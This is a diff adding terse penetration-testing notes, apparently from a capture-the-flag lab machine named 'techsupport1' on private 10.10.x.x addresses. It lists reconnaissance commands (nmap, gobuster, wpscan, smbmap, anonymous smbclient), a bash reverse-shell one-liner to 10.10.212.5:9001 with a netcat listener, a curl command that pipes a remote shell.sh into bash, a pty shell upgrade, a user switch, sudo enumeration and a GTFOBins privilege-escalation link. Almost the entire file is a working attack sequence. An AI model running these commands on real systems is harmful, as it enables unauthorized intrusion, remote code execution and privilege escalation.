@@ -1,0 +1,29 @@
+nmap -sC -sV -oA nmap/techsupport1 10.10.163.9
+sudo nmap -sS -sV 10.10.138.144
+
+
+gobuster dir -v -u http://10.10.163.9 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt | grep -v Missed
+
+wpscan --url http://10.10.16.191/wordpress/ -e u,vp,vt,cb --api-token <token>
+
+smbmap -H 10.10.138.144
+smbclient -N //10.10.9.164/websvr
+
+sh -i >& /dev/tcp/10.10.212.5/9001 0>&1
+in shell.sh
+
+nc -nvlp 9001
+
+curl 10.10.212.5:8000/shell.sh | bash
+
+stableise
+ python -c 'import pty;pty.spawn("/bin/bash")'
+
+/var/html/wordpress
+
+su - scamsite
+
+sudo -l -- see sudo permissions
+
+
+https://gtfobins.github.io/gtfobins/iconv/#sudo
